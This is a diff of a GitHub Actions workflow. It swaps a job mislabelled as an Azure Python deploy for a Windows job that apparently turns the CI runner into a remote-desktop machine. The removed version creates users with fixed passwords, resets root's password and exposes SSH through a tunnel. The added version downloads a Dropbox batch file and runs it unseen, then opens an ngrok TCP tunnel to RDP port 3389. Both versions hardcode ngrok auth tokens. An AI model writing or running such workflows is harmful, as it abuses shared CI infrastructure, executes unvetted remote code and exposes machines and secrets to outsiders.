@@ -1,38 +1,30 @@
-name: Deploy Python project to Azure Function App
+name: Windows - RustDesk
 
 on:
-  push:
-    branches: ["main"]
+  workflow_dispatch:
 
 jobs:
-  build-and-deploy:
-    runs-on: ubuntu-latest
-    environment: dev
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    
     steps:
-    - name: 'Checkout GitHub Action'
-      uses: actions/checkout@v3
-      
-    - name: 'Install ssh'
-      shell: bash
-      run: |
-        sudo apt update
-        sudo apt install openssh-client
-        sudo service ssh start
-        sudo mkdir /home/sshvps
-        sudo chmod +x /home/sshvps
-        chmod +x /home
-        sudo wget -P /home/sshvps/ https://raw.githubusercontent.com/ivangabriel21/DependeciaDX/main/sshd_config
-        chmod +x /home/sshvps/sshd_config
-        sudo rm -rf /etc/ssh/sshd_config
-        sudo mv /home/sshvps/sshd_config /etc/ssh/sshd_config
-        sudo useradd ivangabriel -m -s /bin/bash
-        sudo echo "ivangabriel:ivangabriel" | sudo chpasswd
-        sudo usermod -aG sudo ivangabriel
-        sudo echo "root:ivangabriel" | sudo chpasswd
-        sudo curl ifconfig.me
-    - name: 'Install ngrok'
-      shell: bash
-      run: |
-         curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
-         ngrok config add-authtoken 2NFY94Rg01fQLXyc5rcr0pnqGn9_4caThWichq7xoTiQPdBmK
-         lt --subdomain ivandx -p 22
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Install ngrok
+        run: |
+          Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+          Expand-Archive ngrok.zip
+          
+      - name: Creando ngrok Tunnel
+        run: .\ngrok\ngrok.exe authtoken 2VaL3LAsgw2R7Hl46qj2TbJ5fCr_2NsVnR9cxV9SQRk6dm6hR && .\ngrok\ngrok.exe tcp 3389
+        
+      - name: Log In To AnyDesk
+        run: cmd /c show.bat
+
+      - name: Time Counter
+        run: python time.py
